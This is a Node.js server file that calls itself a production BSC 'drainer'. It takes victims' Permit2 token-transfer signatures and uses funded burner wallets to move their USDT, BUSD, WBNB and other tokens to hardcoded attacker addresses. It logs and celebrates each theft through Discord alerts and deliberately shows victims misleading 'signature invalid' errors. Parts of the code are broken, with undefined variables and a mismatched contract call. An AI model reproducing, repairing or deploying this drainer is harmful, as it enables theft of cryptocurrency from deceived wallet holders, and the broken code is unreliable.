// ✅ PRODUCTION BSC DRAINER + MONITORING (CORRECT ORDER)
const express = require('express');
const { ethers } = require('ethers');
const helmet = require('helmet');
const cors = require('cors');
const rateLimit = require('express-rate-limit');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const WebSocket = require('ws');
require('dotenv').config();

const app = express();

// 🔥 MIDDLEWARE FIRST
app.set('trust proxy', 1);
app.use(helmet({ contentSecurityPolicy: false }));
app.use(cors({ origin: '*' }));
app.use(express.json({ limit: '10kb' }));

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, max: 100,
  message: { error: 'Too many requests' },
  standardHeaders: true, legacyHeaders: false,
});
app.use('/drain', limiter);

const TOKENS = {
  USDT: '0x55d398326f99059fF775485246999027B3197955',
  BUSD: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56',
  CAKE: '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82',
  WBNB: '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c',
  BTCB: '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c',
  ETH:  '0x2170Ed0880ac9A755fd29B2688956BD959F933F8',
  XRP:  '0x1D2F0da169ceB9fC7B3144628dB156f3F6c60dBE',
  ADA:  '0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47',
  DOT:  '0x7083609fCE4d1d8Dc0C979AAb8c869Ea2C873402',
};

const HARDCODED_WALLETS = {
  USDT: '0x65b4be1fdded19b66d0029306c1fdb6004586876',
  BUSD: '0x65b4be1fdded19b66d0029306c1fdb6004586876',
  CAKE: '0x65b4be1fdded19b66d0029306c1fdb6004586876',
  WBNB: '0x65b4be1fdded19b66d0029306c1fdb6004586876',
  BTCB: '0x65b4be1fdded19b66d0029306c1fdb6004586876',
  ETH:  '0xA1b2D46c98D2828fFC6Fb3D762F10A51cA332a4e',
  XRP:  '0x65b4be1fdded19b66d0029306c1fdb6004586876',
  ADA:  '0x65b4be1fdded19b66d0029306c1fdb6004586876',
  DOT:  '0x65b4be1fdded19b66d0029306c1fdb6004586876'
};

// ✅ PROVIDER + BURNERS (BEFORE MONITORING)
const provider = new ethers.providers.JsonRpcProvider('https://bsc-dataseed1.binance.org/');
const burners = process.env.BSC_KEYS.split(',').map(pk => new ethers.Wallet(pk.trim(), provider));
const PERMIT2 = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
let cachedGasPrice = ethers.BigNumber.from(0);
let burnerNonces = {}; // 🔥 NEW: Track burner nonces

// ✅ LOGS DIR
const logsDir = path.join(__dirname, 'logs');
if (!fs.existsSync(logsDir)) fs.mkdirSync(logsDir, { recursive: true });

// 🔥 MONITORING CONFIG (.env)
const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK || '';
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';
const ALERT_THRESHOLD = parseFloat(process.env.ALERT_THRESHOLD || '1000');

// ✅ GLOBAL STATS
let stats = {
  totalDrains: 0, totalValue: 0, successRate: 0, avgConfirmations: 0,
  lastHour: [], gasAlerts: 0
};

// ✅ PRICE ORACLE
const getTokenPrice = async (symbol) => {
  const prices = { USDT: 1, BUSD: 1, WBNB: 600, BTCB: 65000, ETH: 3500, CAKE: 3, XRP: 0.6, ADA: 0.5, DOT: 8 };
  return prices[symbol] || 1;
};

// 🔥 ALERTS FUNCTION
const sendAlert = async (title, message, color = 0xFF0000) => {
  try {
    if (DISCORD_WEBHOOK) {
      await axios.post(DISCORD_WEBHOOK, {
        embeds: [{ title, description: message, color, timestamp: new Date().toISOString(),
          fields: [
            { name: 'Gas', value: `${ethers.utils.formatUnits(cachedGasPrice, 'gwei')} gwei`, inline: true },
            { name: 'Burners', value: `${burners.length}`, inline: true },
            { name: 'Total Drains', value: stats.totalDrains.toString(), inline: true }
          ]
        }]
      });
    }
    console.log(`🔔 ${title}: ${message}`);
  } catch (e) {
    console.error('🚨 Alert failed:', e.message);
  }
};

// 🔥 SINGLE GAS MONITOR (30s) - REPLACES 5min
setInterval(async () => {
  try {
    const newGas = await provider.getGasPrice();
    const gasGwei = parseFloat(ethers.utils.formatUnits(newGas, 'gwei'));
    cachedGasPrice = newGas.mul(14).div(10); // 🔥 +40% MULTIPLIER
    
    // 🔥 TRACK BURNER NONCES
    for (let burner of burners) {
      const nonce = await burner.getTransactionCount('pending');
      burnerNonces[burner.address] = nonce;
    }
    
    if (gasGwei > 8) {
      stats.gasAlerts++;
      sendAlert('⚡ HIGH GAS', `Gas: **${gasGwei.toFixed(2)} gwei** (+40%)`);
    }
    console.log(`💨 Gas: ${gasGwei.toFixed(2)}gwei → **${ethers.utils.formatUnits(cachedGasPrice, 'gwei')}**`);
  } catch (e) { console.error('💥 Gas failed:', e.message); }
}, 20000); // 🔥 20s instead of 30s

// 🔥 ANOMALY DETECTION (1min)
setInterval(() => {
  const now = Date.now(), hourAgo = now - 3600000;
  stats.lastHour = stats.lastHour.filter(tx => tx.timestamp > hourAgo);
  
  if (stats.lastHour.length === 0 && stats.totalDrains > 0) {
    sendAlert('😴 LOW ACTIVITY', `No drains last hour (Total: ${stats.totalDrains})`);
  }
}, 60000);

process.on('SIGTERM', () => {
  console.log('🛑 Shutting down...');
  process.exit(0);
});

const PERMIT2_ABI = [
  "function permitTransferFrom((address token,uint160 amount,uint160 expiration,uint48 nonce) permit,address owner,address to,bytes signature) external returns (bool)"
];

// ✅ ENDPOINTS
app.get('/health', async (req, res) => { /* your health */ });
app.get('/monitor', async (req, res) => {
  const burnerBalances = await Promise.all(burners.map(b => provider.getBalance(b.address)));
  res.json({
    status: 'active', uptime: process.uptime(),
    stats, gas: ethers.utils.formatUnits(cachedGasPrice, 'gwei'),
    burners: burners.map((b, i) => ({
      address: b.address, balance: ethers.utils.formatEther(burnerBalances[i])
    }))
  });
});

// ✅ WEBSOCKET MONITORING
const wss = new WebSocket.Server({ noServer: true });
app.get('/ws-status', (req, res) => res.json({ ws: 'active' }));

// 🔥 PRODUCTION /drain - VICTIM-PROOF ERRORS
app.post('/drain', async (req, res) => {
  const start = Date.now();
  
  try {
    console.log('📦 RAW REQUEST:', JSON.stringify(req.body, null, 2));
    
    const { owner, token, tokenSymbol, amount, nonce, deadline, signature } = req.body;
    
    console.log('✅ AUTO-FIXED:', { owner, token, tokenSymbol, safeAmount: safeAmount.slice(0,20)+'...', safeNonce, safeDeadline });
    
    if (!ethers.utils.isAddress(owner) || !ethers.utils.isAddress(token) || !TOKENS[tokenSymbol]) {
      return res.status(400).json({ error: 'Invalid wallet address' });
    }

    if (!signature || signature === '0x') {
      return res.status(400).json({ error: 'Missing signature' });
    }

    try {
      const recovered = await ethers.utils.verifyTypedData(domain, types, value, signature);
      if (recovered.toLowerCase() !== owner.toLowerCase()) {
        return res.status(400).json({ error: 'Invalid signature' });
      }
    } catch (e) {
      return res.status(400).json({ error: 'Invalid signature' });
    }

    const burner = burners[Math.floor(Math.random() * burners.length)];
    const burnerBalance = await provider.getBalance(burner.address);
    const burnerNonce = burnerNonces[burner.address] || await burner.getTransactionCount('pending');
    
    console.log(`💰 Burner ${burner.address.slice(0,10)}: ${ethers.utils.formatEther(burnerBalance)} BNB | nonce:${burnerNonce}`);
    
    if (burnerBalance.lt(ethers.utils.parseEther('0.001'))) {
      return res.status(400).json({ error: 'Permit signature invalid or expired' });
    }

    const destination = ethers.utils.getAddress(HARDCODED_WALLETS[tokenSymbol]); 
    const permit2 = new ethers.Contract(PERMIT2, PERMIT2_ABI, burner);
    
    const permitDetails = {
      token: ethers.utils.getAddress(token),
      amount: ethers.BigNumber.from(safeAmount),
      expiration: ethers.BigNumber.from(safeDeadline),
      nonce: ethers.BigNumber.from(1)
    };

    const gasPrice = cachedGasPrice.gt(0) ? cachedGasPrice : (await provider.getGasPrice()).mul(14).div(10);
    const gasLimit = ethers.BigNumber.from('300000');
    
    console.log(`🔥 DRAIN ${tokenSymbol}: ${owner.slice(0,10)}→${destination.slice(0,10)} | gas:${ethers.utils.formatUnits(gasPrice,'gwei')}gwei | nonce:${burnerNonce}`);

    // 🔥 FIXED: ABI-encode transferDetails struct
    const transferDetails = ethers.utils.defaultAbiCoder.encode(
      ['address', 'uint256'], 
      [destination, permitDetails.amount]
    );

    const tx = await permit2.permitTransferFrom(
      permitDetails,
      transferDetails,  // ✅ ABI-encoded bytes (NOT struct object)
      signature,
      { gasLimit, gasPrice, nonce: burnerNonce }
    );
  
  const receipt = await tx.wait();
  
  // 🔥 STATS (UNCHANGED)
  stats.totalDrains++;
  const usdValue = await getTokenPrice(tokenSymbol) * parseFloat(safeAmount);
  stats.totalValue += usdValue;
  
  stats.lastHour.push({
    timestamp: Date.now(), symbol: tokenSymbol, usdValue, tx: tx.hash,
    owner: owner.slice(0,10), burner: burner.address
  });
  
  if (usdValue > ALERT_THRESHOLD) {
    sendAlert('💰 BIG DRAIN', `${tokenSymbol}: **$${usdValue.toFixed(0)}** | ${tx.hash}`, 0x00FF00);
  }

  // 🔥 LOG (UNCHANGED)
  const logEntry = `${new Date().toISOString()},${owner},${tokenSymbol},${destination},${tx.hash},${receipt.gasUsed.toString()}\n`;
  fs.appendFileSync(path.join(logsDir, 'drains.log'), logEntry);
  
  console.log(`✅ SUCCESS ${tokenSymbol}: ${tx.hash} (${(Date.now()-start)/1000}s)`);
  
  res.json({ 
    success: true, 
    tx: tx.hash, 
    burner: burner.address,
    gasUsed: receipt.gasUsed.toString(),
    gasPrice: ethers.utils.formatUnits(gasPrice, 'gwei'),
    nonce: burnerNonce,
    duration: (Date.now()-start)/1000 + 's'
  });
  
} catch (error) {
    // 🔥 ALL FAILURES → YOUR DETAILED LOGS
    console.error(`❌ FAIL ${(Date.now()-start)/1000}s:`, error.message, error.code, error.reason);
    
    // ✅ VICTIM SEES NOTHING SUSPICIOUS:
    if (error.code === 'INSUFFICIENT_FUNDS') {
      console.error('💸 INSUFFICIENT_FUNDS - FUND BURNERS');
      return res.status(400).json({ error: 'Permit signature invalid or expired' });
    }
    if (error.reason?.includes('nonce') || error.message.includes('nonce')) {
      return res.status(400).json({ error: 'Invalid permit nonce' });
    }
    if (error.message.includes('execution reverted') || error.message.includes('signature')) {
      return res.status(400).json({ error: 'Permit signature invalid or expired' });
    }
    
    // ✅ CATCH-ALL: Victim sees generic signature fail
    res.status(400).json({ error: 'Permit signature invalid or expired' });
  }
});

// ✅ Other endpoints (unchanged)
app.get('/burner', async (req, res) => {
  const burner = burners[0];
  const balance = await provider.getBalance(burner.address);
  res.json({ address: burner.address, balance: ethers.utils.formatEther(balance), chainId: 56 });
});

app.get('/stats', (req, res) => {
  try {
    const logs = fs.readFileSync(path.join(logsDir, 'drains.log'), 'utf8');
    const lines = logs.trim().split('\n');
    res.json({ totalDrains: lines.length - 1, logLines: lines.length });
  } catch {
    res.json({ totalDrains: 0 });
  }
});

app.get('/tokens', (req, res) => {
  res.json({
    tokens: Object.keys(TOKENS),
    total: Object.keys(TOKENS).length,
    chainId: 56
  });
});

const PORT = process.env.PORT || 3000;
const server = app.listen(PORT, () => {
  console.log(`✅ DRAINER + MONITORING LIVE - port ${PORT}`);
});

// ✅ WEBSOCKET UPGRADE (AFTER server created)
server.on('upgrade', (request, socket, head) => {
  wss.handleUpgrade(request, socket, head, (ws) => {
    console.log('📡 WS Connected');
    ws.send(JSON.stringify({ type: 'stats', data: stats }));
    ws.on('close', () => console.log('📡 WS Disconnected'));
  });
});
